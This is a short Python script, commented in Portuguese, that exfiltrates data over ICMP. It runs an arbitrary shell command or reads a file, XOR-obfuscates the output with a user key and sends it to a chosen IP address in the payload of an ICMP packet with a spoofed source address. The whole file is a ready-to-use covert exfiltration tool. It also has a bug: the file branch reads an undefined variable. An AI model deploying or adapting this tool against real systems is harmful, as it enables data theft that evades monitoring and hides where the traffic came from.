from scapy.all import *
import argparse as ap
from subprocess import Popen, STDOUT, PIPE
import random as rd
import string

def collectData(command, file):
    data = None
    if command:
        cmdresult = Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
        data = cmdresult.stdout.read().decode()
    elif file:
        data = f.read()
    return data



def XOREncode(data, key):
    return ''.join(chr(ord(charData) ^ ord(key[idxData%len(key)])) for idxData, charData in enumerate(data))



def sendData(data, ip):
    print(type(conf.iface))
    pckt = IP(dst=ip, src='200.52.10.10')/ICMP()/Raw(load=data)
    send(pckt, iface=IFACES.dev_from_index(15))



if __name__ == '__main__':
    parser = ap.ArgumentParser(description="Exfiltração de dados via pacotes ICMP.")
    parser.add_argument('ip', help='O endereço IP de destino.')
    parser.add_argument('key', help='A chave para realizar o XOR.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-c', '--command', help='Um comando a ser executado.')
    group.add_argument('-f', '--file', type=ap.FileType(mode='r'), help='O caminho completo de um arquivo.')
    args = parser.parse_args()

    data = collectData(args.command, args.file)
    if data != None:
        xoreddata = XOREncode(data, args.key)
        sendData(xoreddata, args.ip)
    else:
        print('Nada a enviar. Abortando...')
        exit(1)

